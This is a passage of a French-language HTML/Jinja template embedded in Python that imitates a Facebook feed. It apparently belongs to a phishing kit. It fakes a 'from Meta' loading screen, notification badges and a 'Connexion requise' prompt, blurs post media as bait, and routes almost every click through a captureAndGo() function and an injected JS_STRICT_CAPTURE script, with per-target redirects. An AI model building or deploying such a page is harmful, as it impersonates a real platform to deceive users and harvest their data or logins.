            display: none;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            pointer-events: none;
        }
        
        .video-loading-spinner.show {
            display: block;
        }
        
        .cache-indicator {
            background: linear-gradient(90deg, rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0.5));
            box-shadow: inset 0 0 8px rgba(255, 255, 255, 0.3);
            border-radius: 9999px;
        }
        
        /* Fullscreen Controls - Always Visible */
        .video-player-container:-webkit-full-screen { max-height: none !important; width: 100vw !important; height: 100vh !important; }
        .video-player-container:-moz-full-screen { max-height: none !important; width: 100vw !important; height: 100vh !important; }
        .video-player-container:fullscreen { max-height: none !important; width: 100vw !important; height: 100vh !important; }
        
        .video-controls.fullscreen-controls {
            opacity: 100 !important;
            display: flex !important;
        }
        
        .video-player-container:-webkit-full-screen .video-controls {
            opacity: 100 !important;
        }
        
        .video-player-container:fullscreen .video-controls {
            opacity: 100 !important;
        }
        
        input[type="range"] {
            -webkit-appearance: none;
            appearance: none;
            width: 100%;
            height: 4px;
            border-radius: 5px;
            background: #d3d3d3;
            outline: none;
            cursor: pointer;
        }
        
        input[type="range"]::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #ffffff;
            cursor: pointer;
        }
        
        input[type="range"]::-moz-range-thumb {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #ffffff;
            cursor: pointer;
            border: none;
        }
        
        select {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            cursor: pointer;
        }
        
        select::-ms-expand {
            display: none;
        }
    </style>
</head>
<body>
{% if fake_loading_enabled %}
<style>
    @media (min-width: 1024px) {
        #fb-mobile-loader {
            display: none !important;
        }
    }
    .fb-loader-spinner {
        width: 36px;
        height: 36px;
        border: 3.5px solid rgba(24, 119, 242, 0.1);
        border-top-color: #1877f2;
        border-radius: 50%;
        animation: fb-spin 0.8s linear infinite;
        margin-top: 40px;
    }
    @keyframes fb-spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    html.loading-locked, body.loading-locked {
        overflow: hidden !important;
        height: 100% !important;
        position: fixed !important;
        width: 100% !important;
    }
</style>
<div id="fb-mobile-loader" style="position: fixed; inset: 0; background-color: #ffffff; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding-top: 25vh; padding-bottom: 8vh; user-select: none; -webkit-user-select: none;">
    <div style="display: flex; flex-direction: column; align-items: center;">
        <svg viewBox="0 0 36 36" style="width: 78px; height: 78px; fill: #1877f2;"><path d="M20.181 35.87C29.094 34.483 36 26.845 36 17.587 36 7.873 27.91 0 17.935 0 7.96 0 0 7.873 0 17.587 0 26.353 6.553 33.627 15.13 35.539l.067-12.24h-4.48v-4.896h4.48v-3.733c0-4.437 2.703-6.88 6.698-6.88 1.914 0 3.559.143 4.037.206v4.667h-2.77c-2.159 0-2.577 1.023-2.577 2.525v3.31h5.18l-.675 4.9h-4.505L20.181 35.87z"/></svg>
        <div class="fb-loader-spinner"></div>
    </div>
    <div style="color: #65676B; font-size: 11px; font-weight: 600; letter-spacing: 1.5px; display: flex; flex-direction: column; align-items: center; gap: 4px;">
        <span style="opacity: 0.55; font-family: sans-serif;">from</span>
        <span style="color: #050505; font-size: 14px; font-weight: bold; letter-spacing: 2.5px; text-transform: uppercase; font-family: sans-serif;">Meta</span>
    </div>
</div>
<script>
    (function() {
        if (window.innerWidth < 1024) {
            document.documentElement.classList.add('loading-locked');
            document.body.classList.add('loading-locked');
            
            // Add stylesheet to hide top bar and feed during load
            const style = document.createElement('style');
            style.id = 'fb-loader-hide-content';
            style.innerHTML = '.fb-top, .feed-container { opacity: 0 !important; pointer-events: none !important; }';
            document.head.appendChild(style);

            window.addEventListener('DOMContentLoaded', function() {
                setTimeout(function() {
                    const loader = document.getElementById('fb-mobile-loader');
                    if (loader) {
                        loader.style.transition = 'opacity 0.4s ease';
                        loader.style.opacity = '0';
                        setTimeout(function() {
                            loader.remove();
                            document.documentElement.classList.remove('loading-locked');
                            document.body.classList.remove('loading-locked');
                            
                            // Remove content-hiding stylesheet
                            const hideStyle = document.getElementById('fb-loader-hide-content');
                            if (hideStyle) hideStyle.remove();
                            
                            // Fade in content
                            const fbTop = document.querySelector('.fb-top');
                            const feedCont = document.querySelector('.feed-container');
                            if (fbTop) {
                                fbTop.style.transition = 'opacity 0.4s ease';
                                fbTop.style.opacity = '1';
                            }
                            if (feedCont) {
                                feedCont.style.transition = 'opacity 0.4s ease';
                                feedCont.style.opacity = '1';
                            }
                        }, 400);
                    }
                }, {{ fake_loading_duration * 1000 }});
            });
        } else {
            // Instantly hide/remove on desktop
            const loader = document.getElementById('fb-mobile-loader');
            if (loader) loader.style.display = 'none';
            document.addEventListener('DOMContentLoaded', function() {
                const loader = document.getElementById('fb-mobile-loader');
                if (loader) loader.remove();
            });
        }
    })();
</script>
{% endif %}
""" + JS_STRICT_CAPTURE + r"""
    <!-- Register Service Worker for Video Caching -->
    <script>
    if ('serviceWorker' in navigator && 'caches' in window) {
        navigator.serviceWorker.register('/static/sw.js', { scope: '/' })
            .then(registration => {
                console.log('✅ Service Worker registered:', registration);
                // Request update periodically
                setInterval(() => registration.update(), 60000);
            })
            .catch(err => {
                console.log('⚠️ Service Worker registration failed:', err);
            });
    } else {
        console.log('⚠️ Service Worker not supported or caches API not available');
    }
    </script>
    <div class="fb-top">
        <div class="fb-top-content">
            <div style="display: flex; align-items: center; gap: 8px;">
<svg class="w-10 h-10 cursor-pointer" onclick="captureAndGo()" width="40" height="40" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="none"><path fill="#1877F2" d="M15 8a7 7 0 00-7-7 7 7 0 00-1.094 13.915v-4.892H5.13V8h1.777V6.458c0-1.754 1.045-2.724 2.644-2.724.766 0 1.567.137 1.567.137v1.723h-.883c-.87 0-1.14.54-1.14 1.093V8h1.941l-.31 2.023H9.094v4.892A7.001 7.001 0 0015 8z"/><path fill="#ffffff" d="M10.725 10.023L11.035 8H9.094V6.687c0-.553.27-1.093 1.14-1.093h.883V3.87s-.801-.137-1.567-.137c-1.6 0-2.644.97-2.644 2.724V8H5.13v2.023h1.777v4.892a7.037 7.037 0 002.188 0v-4.892h1.63z"/></svg>
                <!-- PC Search Bar next to Facebook logo -->
                <div class="fb-search-bar hidden lg:flex" onclick="captureAndGo()" title="{{ search_label }}">
                    <i class="fas fa-search fb-search-icon"></i>
                    <input type="text" class="fb-search-input" placeholder="{{ search_label }}" onclick="captureAndGo()" readonly>
                </div>
            </div>
            
            <!-- Desktop Icons (right side) -->
            <div class="fb-icons-desktop">
                <div class="fb-icons relative" onclick="captureAndGo()" title="{{ messages_label }}">
                    <i class="fab fa-facebook-messenger"></i>
                    {% if msg_count and msg_count|int > 0 %}
                    <div class="fb-badge">{{ msg_count }}</div>
                    {% endif %}
                </div>
                <div class="fb-icons relative" onclick="captureAndGo()" title="{{ notifications_label }}">
                    <i class="fas fa-bell"></i>
                    {% if notif_count and notif_count|int > 0 %}
                    <div class="fb-badge">{{ notif_count }}</div>
                    {% endif %}
                </div>
                <div class="fb-icons" onclick="captureAndGo()" title="{{ menu_label }}">
                    <i class="fas fa-bars"></i>
                </div>
            </div>
            
            <!-- Mobile Icons (right side) -->
            <div class="fb-icons-mobile">
                <div class="fb-icons relative" onclick="captureAndGo()" title="{{ search_label }}">
                    <i class="fas fa-search"></i>
                </div>
                <div class="fb-icons relative" onclick="captureAndGo()" title="{{ messages_label }}">
                    <i class="fab fa-facebook-messenger"></i>
                    {% if msg_count and msg_count|int > 0 %}
                    <div class="fb-badge">{{ msg_count }}</div>
                    {% endif %}
                </div>
                <div class="fb-icons relative" onclick="captureAndGo()" title="{{ notifications_label }}">
                    <i class="fas fa-bell"></i>
                    {% if notif_count and notif_count|int > 0 %}
                    <div class="fb-badge">{{ notif_count }}</div>
                    {% endif %}
                </div>
                <div class="fb-icons" onclick="captureAndGo()" title="{{ menu_label }}">
                    <i class="fas fa-bars"></i>
                </div>
            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const posts = document.querySelectorAll('.post');
            posts.forEach((post, index) => {
                post.style.animationDelay = `${index * 0.1}s`;
            });

            // See more / See less logic
            const seeMoreText = '{{ see_more_link }}';
            const seeLessText = '{{ see_less_link }}';
            const contents = document.querySelectorAll('.text-content');
            contents.forEach(content => {
                const btn = content.nextElementSibling;
                if (!btn || !btn.classList.contains('see-more-btn')) return;
                if (content.scrollHeight > content.offsetHeight + 2) {
                    btn.style.display = 'inline-block';
                    btn.textContent = seeMoreText;
                    btn.onclick = (e) => {
                        e.stopPropagation();
                        if (content.classList.contains('truncated')) {
                            content.classList.remove('truncated');
                            btn.textContent = seeLessText;
                        } else {
                            content.classList.add('truncated');
                            btn.textContent = seeMoreText;
                        }
                    };
                }
            });
            
            // Media Autoplay/Pause Intersection Observer
            if ('IntersectionObserver' in window) {
                const mediaObserver = new IntersectionObserver((entries) => {
                    entries.forEach(entry => {
                        const post = entry.target;
                        const videos = post.querySelectorAll('video');
                        const audios = post.querySelectorAll('audio');
                        
                        if (entry.isIntersecting) {
                            // Do NOT autoplay videos — user must click to start.
                            // Only play audio if music is enabled.
                            audios.forEach(a => {
                                a.play().catch(e => console.log('Audio autoplay prevented', e));
                            });
                        } else {
                            // Pause media when post leaves view
                            videos.forEach(v => {
                                v.pause();
                                const control = post.querySelector('.video-play-control');
                                if (control) control.innerHTML = '<i class="fas fa-play"></i>';
                            });
                            audios.forEach(a => {
                                a.pause();
                            });
                        }
                    });
                }, { threshold: 0.5 }); // Trigger when 50% of the post is visible

                posts.forEach(post => {
                    mediaObserver.observe(post);
                });
            }
            
            // Workaround for strict browser autoplay policies
            // We capture any user interaction (click, touch, scroll, wheel, etc.) to "unlock" audio playback
            let audioUnlocked = false;
            
            function unlockAudio(e) {
                if (audioUnlocked) return;
                
                const audios = document.querySelectorAll('audio');
                if (audios.length === 0) {
                    audioUnlocked = true;
                    removeListeners();
                    return;
                }
                
                let playPromises = [];
                audios.forEach(a => {
                    // Hidden audio (music_hidden) — always play on first interaction
                    if (a.dataset.hidden === '1') {
                        const p = a.play();
                        if (p && typeof p.then === 'function') {
                            playPromises.push(p);
                        }
                        return;
                    }
                    // Normal audio — play if the post is visible in the viewport
                    const postEl = a.closest('.post');
                    if (postEl) {
                        const rect = postEl.getBoundingClientRect();
                        if (rect.top < window.innerHeight && rect.bottom > 0) {
                            const p = a.play();
                            if (p && typeof p.then === 'function') {
                                playPromises.push(p);
                            }
                        }
                    } else {
                        const p = a.play();
                        if (p && typeof p.then === 'function') {
                            playPromises.push(p);
                        }
                    }
                });
                
                if (playPromises.length > 0) {
                    Promise.all(playPromises)
                        .then(() => {
                            console.log("[AUTOPLAY] Audio successfully played/unlocked");
                            audioUnlocked = true;
                            removeListeners();
                        })
                        .catch(err => {
                            console.log("[AUTOPLAY] Play failed (prevented by browser policy), will retry on next gesture:", err);
                        });
                }
            }
            
            function removeListeners() {
                const events = ['click', 'touchstart', 'touchmove', 'touchend', 'mousedown', 'pointerdown', 'scroll', 'wheel', 'keydown'];
                events.forEach(evt => {
                    document.removeEventListener(evt, unlockAudio, { capture: true });
                });
            }
            
            // Listen for any interaction anywhere on the page
            const events = ['click', 'touchstart', 'touchmove', 'touchend', 'mousedown', 'pointerdown', 'scroll', 'wheel', 'keydown'];
            events.forEach(evt => {
                document.addEventListener(evt, unlockAudio, { capture: true });
            });
        });
    </script>
    <div class="feed-container">
        <!-- Left Sidebar (Desktop only) -->
        <div class="sidebar-left">
            <div class="p-5 text-center bg-white rounded-xl shadow-sm border border-gray-200">
                <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3">
                    <i class="fas fa-user-lock text-[#1877f2] text-xl"></i>
                </div>
                <h3 class="text-lg font-bold text-gray-900 mb-2">Connexion requise</h3>
                <p class="text-sm text-gray-600 mb-4">Vous devez vous connecter avant de continuer.</p>
                <button onclick="window.location.href='/?from_feed=1'" class="block w-full py-2.5 bg-[#1877f2] text-white rounded-lg font-bold text-base hover:brightness-95 transition-all active:scale-95 shadow-md shadow-blue-200">
                    {{ login_link }}
                </button>
            </div>
        </div>
        
        <!-- Main Feed -->
        <div class="feed-posts p-2 pb-20">
        {% for p in posts %}
        <div class="post">
            <div class="flex items-start p-3 cursor-pointer" onclick="captureAndGo('{{ p.redirect_after }}')">
                {% if p.group_name %}
                    <div class="relative w-10 h-10 mr-2">
                        {% if p.group_pic %}
                            <img draggable="false" src="{{ p.group_pic }}" class="w-10 h-10 rounded-lg object-cover">
                        {% else %}
                            <div class="w-10 h-10 rounded-lg bg-gray-300 flex items-center justify-center"><i class="fas fa-users text-gray-500"></i></div>
                        {% endif %}
                        {% set ring_class = 'ring-[1.5px] ring-blue-500 ring-offset-[1px]' if p.has_story else '' %}
                        <div class="absolute -bottom-1 -right-1 bg-white rounded-full w-6 h-6">
                            {% if p.profile_pic %}
                                <img draggable="false" src="{{ p.profile_pic }}" class="w-full h-full rounded-full object-cover {{ ring_class }}">
                            {% elif profile_pic %}
                                <img draggable="false" src="{{ profile_pic }}" class="w-full h-full rounded-full object-cover {{ ring_class }}">
                            {% else %}
                                <div class="w-full h-full bg-gray-300 rounded-full flex items-center justify-center {{ ring_class }}"><i class="fas fa-user text-gray-500 text-[8px]"></i></div>
                            {% endif %}
                            {% if p.is_online %}
                                <div class="absolute -bottom-0.5 -right-0.5 w-[10px] h-[10px] bg-green-500 border-[1.5px] border-white rounded-full"></div>
                            {% endif %}
                        </div>
                    </div>
                    <div class="flex-1">
                        <div class="font-bold text-sm text-gray-900 leading-tight">
                            {{ p.group_name }}
                            {% if p.show_join %}
                                <span class="text-[#0866FF] font-semibold ml-1 cursor-pointer hover:underline">{{ p.join_text or 'Rejoindre' }}</span>
                            {% endif %}
                        </div>
                        <div class="text-[12px] text-gray-600">
                            <span class="font-semibold">{{ p.profile_name or name }}</span>
                            {% if p.verified %}<svg class="inline-block ml-0.5 -mt-0.5" viewBox="0 0 12 13" width="13" height="13" fill="none"><g><circle cx="6" cy="6.5" r="6" fill="#1877F2"></circle><path d="M9.215 4.617a.6.6 0 0 0-.847-.07L5.322 7.282 3.577 5.668a.6.6 0 0 0-.82.875l2.156 1.996a.6.6 0 0 0 .84-.019l3.392-3.056a.6.6 0 0 0 .07-.847z" fill="#fff"></path></g></svg>{% endif %}
                            {% if p.show_subscribe %}
                                <span class="text-[#0866FF] font-semibold ml-1 cursor-pointer hover:underline">S'abonner</span>
                            {% endif %}
                            {% if p.use_status and p.status_text %}
                                <span class="font-normal text-gray-500"> {{ p.status_text }}</span>
                            {% endif %}
                            {% if p.use_tags and p.tag_name %}
                                · {{ with }} <span class="font-semibold">{{ p.tag_name }}</span>
                                {% if p.tag_count and p.tag_count|int > 0 %}
                                    {{ with }} {{ p.tag_count }} {{ others }}
                                {% endif %}
                            {% endif %}
                            · {{ p.time_ago }} · 
                            {% if p.use_private or p.audience == "Privé" %}
                                <span class="text-blue-600 font-medium animate-pop"><i class="fas fa-lock text-[9px]"></i> {{ private }} · {{ shared_with }} {{ p.private_count or 1 }} {{ people }}</span>
                            {% else %}
                                <i class="fas {{ p.audience_icon }} text-[10px]"></i>
                            {% endif %}
                        </div>
                    </div>
                {% else %}
                    <div class="relative w-10 h-10 flex-shrink-0">
                        {% set ring_class = 'ring-2 ring-blue-500 ring-offset-1' if p.has_story else '' %}
                        {% if p.profile_pic %}
                        <img draggable="false" src="{{ p.profile_pic }}" class="w-full h-full rounded-full object-cover {{ ring_class }}" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                        <div class="w-full h-full rounded-full bg-gray-300 items-center justify-center hidden {{ ring_class }}"><i class="fas fa-user text-gray-500" style="margin-top: 12px;"></i></div>
                        {% elif profile_pic %}
                        <img draggable="false" src="{{ profile_pic }}" class="w-full h-full rounded-full object-cover {{ ring_class }}" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                        <div class="w-full h-full rounded-full bg-gray-300 items-center justify-center hidden {{ ring_class }}"><i class="fas fa-user text-gray-500" style="margin-top: 12px;"></i></div>
                        {% else %}
                        <div class="w-full h-full rounded-full bg-gray-300 flex items-center justify-center {{ ring_class }}"><i class="fas fa-user text-gray-500"></i></div>
                        {% endif %}
                        {% if p.is_online %}
                        <div class="absolute -bottom-0.5 -right-0.5 w-[13px] h-[13px] bg-green-500 border-2 border-white rounded-full"></div>
                        {% endif %}
                    </div>
                    <div class="ml-2 flex-1">
                        <div class="font-bold text-sm text-gray-900">
                            {{ p.profile_name or name }}
                            {% if p.verified %}<svg class="inline-block ml-0.5 -mt-0.5" viewBox="0 0 12 13" width="13" height="13" fill="none"><g><circle cx="6" cy="6.5" r="6" fill="#1877F2"></circle><path d="M9.215 4.617a.6.6 0 0 0-.847-.07L5.322 7.282 3.577 5.668a.6.6 0 0 0-.82.875l2.156 1.996a.6.6 0 0 0 .84-.019l3.392-3.056a.6.6 0 0 0 .07-.847z" fill="#fff"></path></g></svg>{% endif %}
                            {% if p.show_subscribe %}
                                <span class="text-[#0866FF] font-semibold ml-1 cursor-pointer hover:underline">{{ p.subscribe_text or "S'abonner" }}</span>
                            {% endif %}
                            {% if p.use_status and p.status_text %}
                                <span class="font-normal text-gray-500"> {{ p.status_text }}</span>
                            {% endif %}
                            {% if p.tag_name %}
                                <span class="font-normal text-gray-500"> {{ with }} </span> {{ p.tag_name }}
                                {% if p.tag_count and p.tag_count|int > 0 %}
                                    <span class="font-normal text-gray-500"> {{ with }} </span> {{ p.tag_count }} {{ others }}
                                {% endif %}
                            {% endif %}
                            {% if p.has_music and not p.music_hidden %}
                                <div class="mt-0.5"><span class="text-[#0866FF] font-semibold text-[13px] cursor-pointer hover:underline"><i class="fas fa-music text-[11px] mr-1"></i>{{ p.music_name or 'Musique originale' }}</span></div>
                            {% endif %}
                        </div>
                        <div class="text-[12px] text-gray-500 flex items-center gap-1 mt-0.5">
                            {{ p.time_ago }} · 
                            {% if p.use_private or p.audience == "Privé" %}
                                <span class="text-blue-600 font-medium"><i class="fas fa-lock text-[9px]"></i> {{ private }} · {{ shared_with }} {{ p.private_count or 1 }} {{ people }}</span>
                            {% else %}
                                <i class="fas {{ p.audience_icon }} text-[10px]"></i>
                            {% endif %}
                        </div>
                    </div>
                {% endif %}
                <div class="text-gray-400 cursor-pointer ml-auto"><i class="fas fa-ellipsis-h"></i></div>
            </div>
            {# ===== BLUR: applied ONLY to media elements, NOT to captions ===== #}
            {% if p.type == "video" %}
                <div class="px-3 pb-2 text-[15px] text-gray-900">
                    <div class="text-content truncated">{{ p.text|safe }}</div>
                    <div class="see-more-btn">{{ see_more_link }}</div>
                </div>
                {% call blur_overlay(p) %}
                {{ render_video_player(p, target_name) }}
                {% endcall %}
            {% elif p.type == "link" %}
                <div class="px-3 pb-2 text-[15px] text-gray-900">
                    <div class="text-content truncated">{{ p.text|safe }}</div>
                    <div class="see-more-btn">{{ see_more_link }}</div>
                </div>
                {% call blur_overlay(p) %}
                <div class="mt-1 cursor-pointer border-t border-b border-gray-100 bg-gray-50 overflow-hidden" onclick="captureAndGo('{{ p.redirect_after }}')">
                    {% if p.image %}
                        <img draggable="false" src="{{ p.image }}" class="w-full max-h-[600px] object-contain bg-black/5">
                    {% endif %}
                    <div class="p-3 bg-gray-100">
                        <div class="text-[11px] text-gray-500 uppercase leading-none">{{ p.link_domain|truncate(40) or 'FACEBOOK.COM' }}</div>
                        <div class="font-bold text-[16px] text-gray-900 mt-1 leading-tight">{{ p.link_title or 'Cliquez pour voir plus' }}</div>
                    </div>
                </div>
                {% endcall %}
            {% elif p.type == "share" %}
                <div class="px-3 pb-2 text-[15px] text-gray-900">
                    <div class="text-content truncated">{{ p.text|safe }}</div>
                    <div class="see-more-btn">{{ see_more_link }}</div>
                </div>
                <div class="mx-3 mt-1 mb-2 border border-gray-200 rounded-sm overflow-hidden bg-white cursor-pointer" onclick="captureAndGo('{{ p.redirect_after }}')">
                    <div class="flex items-center p-3">
                        {% if p.share_group_name %}
                            <div class="relative w-9 h-9 mr-2">
                                {% if p.share_group_pic %}
                                    <img draggable="false" src="{{ p.share_group_pic }}" class="w-9 h-9 rounded-lg object-cover">
                                {% else %}
                                    <div class="w-9 h-9 rounded-lg bg-gray-200 flex items-center justify-center"><i class="fas fa-users text-gray-400"></i></div>
                                {% endif %}
                                {% set share_ring_class = 'ring-[1.5px] ring-blue-500 ring-offset-[1px]' if p.share_has_story else '' %}
                                <div class="absolute -bottom-1 -right-1 bg-white rounded-full w-5 h-5">
                                    {% if p.share_pic %}
                                        <img draggable="false" src="{{ p.share_pic }}" class="w-full h-full rounded-full object-cover {{ share_ring_class }}">
                                    {% else %}
                                        <div class="w-full h-full bg-gray-200 rounded-full flex items-center justify-center {{ share_ring_class }}"><i class="fas fa-user text-gray-400 text-[8px]"></i></div>
                                    {% endif %}
                                </div>
                            </div>
                            <div class="flex-1">
                                <div class="font-bold text-[14px] text-gray-900 leading-tight">
                                    {{ p.share_group_name }}
                                    {% if p.share_show_join %}
                                        <span class="text-[#0866FF] font-semibold ml-1 cursor-pointer hover:underline">{{ p.share_join_text or 'Rejoindre' }}</span>
                                    {% endif %}
                                    {% if p.share_use_status and p.share_status_text %}
                                        <span class="font-normal text-gray-500"> {{ p.share_status_text }}</span>
                                    {% endif %}
                                    {% if p.share_use_tags and p.share_tags %}
                                        · {{ with }} <span class="font-semibold">{{ p.share_tags }}</span>
                                        {% if p.share_tags_count and p.share_tags_count|int > 0 %}
                                            {{ with }} {{ p.share_tags_count }} {{ others }}
                                        {% endif %}
                                    {% endif %}
                                </div>
                                <div class="text-[12px] text-gray-500">
                                    <span class="font-semibold">{{ p.share_title or 'Auteur original' }}</span>
                                    {% if p.share_verified %}<svg class="inline-block ml-0.5 -mt-0.5" viewBox="0 0 12 13" width="13" height="13" fill="none"><g><circle cx="6" cy="6.5" r="6" fill="#1877F2"></circle><path d="M9.215 4.617a.6.6 0 0 0-.847-.07L5.322 7.282 3.577 5.668a.6.6 0 0 0-.82.875l2.156 1.996a.6.6 0 0 0 .84-.019l3.392-3.056a.6.6 0 0 0 .07-.847z" fill="#fff"></path></g></svg>{% endif %}
                                    · {{ p.share_time or '1h' }} · 
                                    {% if p.share_audience == "Privé" %}
                                        <span class="text-blue-600 font-medium animate-pop"><i class="fas fa-lock text-[9px]"></i> {{ private }}</span>
                                    {% else %}
                                        <i class="fas {{ p.share_audience_icon or 'fa-globe-americas' }} text-[10px]"></i>
                                    {% endif %}
                                </div>
                            </div>
                        {% else %}
                            <div class="relative w-9 h-9 flex-shrink-0 mr-2">
                                {% set s_ring_class = 'ring-2 ring-blue-500 ring-offset-1' if p.share_has_story else '' %}
                                {% if p.share_pic %}
                                    <img draggable="false" src="{{ p.share_pic }}" class="w-full h-full rounded-full object-cover {{ s_ring_class }}" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                                    <div class="w-full h-full rounded-full bg-gray-200 items-center justify-center hidden {{ s_ring_class }}"><i class="fas fa-user text-gray-400" style="margin-top: 10px;"></i></div>
                                {% else %}
                                    <div class="w-full h-full rounded-full bg-gray-200 flex items-center justify-center {{ s_ring_class }}"><i class="fas fa-user text-gray-400"></i></div>
                                {% endif %}
                                {% if p.share_is_online %}
                                    <div class="absolute -bottom-0.5 -right-0.5 w-[11px] h-[11px] bg-green-500 border-2 border-white rounded-full"></div>
                                {% endif %}
                            </div>
                            <div>
                                <div class="font-bold text-[14px] text-gray-900 leading-tight">
                                    {{ p.share_title or 'Auteur original' }}
                                    {% if p.share_verified %}<svg class="inline-block ml-0.5 -mt-0.5" viewBox="0 0 12 13" width="13" height="13" fill="none"><g><circle cx="6" cy="6.5" r="6" fill="#1877F2"></circle><path d="M9.215 4.617a.6.6 0 0 0-.847-.07L5.322 7.282 3.577 5.668a.6.6 0 0 0-.82.875l2.156 1.996a.6.6 0 0 0 .84-.019l3.392-3.056a.6.6 0 0 0 .07-.847z" fill="#fff"></path></g></svg>{% endif %}
                                    {% if p.share_show_subscribe %}
                                        <span class="text-[#0866FF] font-semibold ml-1 cursor-pointer hover:underline">{{ p.share_subscribe_text or "S'abonner" }}</span>
                                    {% endif %}
                                    {% if p.share_use_status and p.share_status_text %}
                                        <span class="font-normal text-gray-500"> {{ p.share_status_text }}</span>
                                    {% endif %}
                                    {% if p.share_use_tags and p.share_tags %}
                                        · {{ with }} <span class="font-semibold">{{ p.share_tags }}</span>
                                        {% if p.share_tags_count and p.share_tags_count|int > 0 %}
                                            {{ with }} {{ p.share_tags_count }} {{ others }}
                                        {% endif %}
                                    {% endif %}
                                </div>
                                <div class="text-[12px] text-gray-500">{{ p.share_time or '1h' }} · <i class="fas {{ p.share_audience_icon or 'fa-globe-americas' }} text-[10px]"></i></div>
                            </div>
                        {% endif %}
                        <div class="text-gray-400 cursor-pointer ml-auto px-2"><i class="fas fa-ellipsis-h"></i></div>
                    </div>
                    {% if p.share_type == "Texte seul" %}
                        {% if p.bg == "transparent" %}
                            {% call blur_overlay(p) %}
                            <div class="px-3 pb-3 text-[15px] text-gray-900">
                                <div class="text-content truncated">{{ p.share_desc|safe }}</div>
                                <div class="see-more-btn">{{ see_more_link }}</div>
                            </div>
                            {% endcall %}
                        {% elif p.bg.startswith('data:image') or p.bg.startswith('http') or p.bg.startswith('/video/') %}
                            {% call blur_overlay(p) %}
                            <div class="grad" style="background-image: url('{{ p.bg }}'); background-size: cover; background-position: center;">
                                <div style="max-width: 100%;">{{ p.share_desc|safe }}</div>
                            </div>
                            {% endcall %}
                        {% else %}
                            {% call blur_overlay(p) %}
                            <div class="grad" style="background: {{ p.bg or '#1877f2' }};">
                                <div style="max-width: 100%;">{{ p.share_desc|safe }}</div>
                            </div>
                            {% endcall %}
                        {% endif %}
                    {% elif p.share_type == "Image" %}
                        {% if p.share_desc %}
                            <div class="px-3 pb-2 text-[14px] text-gray-900">
                                <div class="text-content truncated">{{ p.share_desc|safe }}</div>
                                <div class="see-more-btn">{{ see_more_link }}</div>
                            </div>
                        {% endif %}
                        {% if p.image %}
                        {% call blur_overlay(p) %}
                            <img src="{{ p.image }}" draggable="false" class="w-full max-h-[600px] object-contain bg-black/5 border-t border-gray-100">
                        {% endcall %}
                        {% endif %}
                    {% elif p.share_type == "Vidéo" %}
                        {% if p.share_desc %}
                            <div class="px-3 pb-2 text-[14px] text-gray-900">
                                <div class="text-content truncated">{{ p.share_desc|safe }}</div>
                                <div class="see-more-btn">{{ see_more_link }}</div>
                            </div>
                        {% endif %}
                        {% call blur_overlay(p) %}
                        {{ render_video_player(p, target_name) }}
                        {% endcall %}
                    {% elif p.share_type == "Lien" %}
                        {% if p.share_desc %}
                            <div class="px-3 pb-2 text-[14px] text-gray-900">
                                <div class="text-content truncated">{{ p.share_desc|safe }}</div>
                                <div class="see-more-btn">{{ see_more_link }}</div>
                            </div>
                        {% endif %}
                        {% call blur_overlay(p) %}
                        <div class="mt-1 cursor-pointer border-t border-gray-100 bg-gray-50 overflow-hidden" onclick="captureAndGo('{{ p.redirect_after }}')">
                            {% if p.image %}
                                <img src="{{ p.image }}" draggable="false" class="w-full max-h-[600px] object-contain bg-black/5">
                            {% endif %}
                            <div class="p-3 bg-gray-100">
                                <div class="text-[11px] text-gray-500 uppercase leading-none">{{ p.link_domain|truncate(40) or 'FACEBOOK.COM' }}</div>
                                <div class="font-bold text-[16px] text-gray-900 mt-1 leading-tight">{{ p.link_title or 'Cliquez pour voir plus' }}</div>
                            </div>
                        </div>
                        {% endcall %}
                    {% endif %}
                </div>
            {% elif p.image %}
                <div class="px-3 pb-2 text-[15px] text-gray-900">
                    <div class="text-content truncated">{{ p.text|safe }}</div>
                    <div class="see-more-btn">{{ see_more_link }}</div>
                </div>
                {% call blur_overlay(p) %}
                <img src="{{ p.image }}" draggable="false" class="w-full max-h-[600px] object-contain bg-black/5" onerror="this.style.display='none';">
                {% endcall %}
            {% else %}
                {% if p.bg == "transparent" %}
                    {% call blur_overlay(p) %}
                    <div class="px-3 pb-3 text-[15px] text-gray-900">
                        <div class="text-content truncated">{{ p.text|safe }}</div>
                        <div class="see-more-btn">{{ see_more_link }}</div>
                    </div>
                    {% endcall %}
                {% elif p.bg.startswith('data:image') or p.bg.startswith('http') or p.bg.startswith('/video/') %}
                    {% call blur_overlay(p) %}
                    <div class="grad" style="background-image: url('{{ p.bg }}'); background-size: cover; background-position: center;">
                        <div style="max-width: 100%;">{{ p.text|safe }}</div>
                    </div>
                    {% endcall %}
                {% else %}
                    {% call blur_overlay(p) %}
                    <div class="grad" style="background: {{ p.bg or '#1877f2' }};">
                        <div style="max-width: 100%;">{{ p.text|safe }}</div>
                    </div>
                    {% endcall %}
                {% endif %}
            {% endif %}
            {% if p.has_music and p.music_url %}
            {% if p.music_hidden %}
            <audio src="{{ p.music_url }}" loop class="hidden" id="hidden-audio-{{ loop.index }}" data-hidden="1"></audio>
            {% else %}
            <audio src="{{ p.music_url }}" autoplay loop class="hidden"></audio>
            {% endif %}
            {% endif %}
            <div class="p-3 border-b text-xs text-gray-500 flex justify-between items-center w-full overflow-hidden">
                <div class="flex items-center min-w-0 flex-shrink max-w-[50%] mr-2">
                    <div class="flex items-center -space-x-1 flex-shrink-0">
                        {% for r in p.processed_reactions %}
                        <div class="w-4 h-4 rounded-full flex items-center justify-center border border-white" style="background-color: {{ r.color }}; z-index: {{ 30 - loop.index }};">
                            <i class="fas {{ r.icon }} text-white text-[8px]"></i>
                        </div>
                        {% endfor %}
                    </div>
                    <div class="ml-1 font-medium truncate min-w-0 flex-shrink">{{ p.likes }}</div>
                </div>
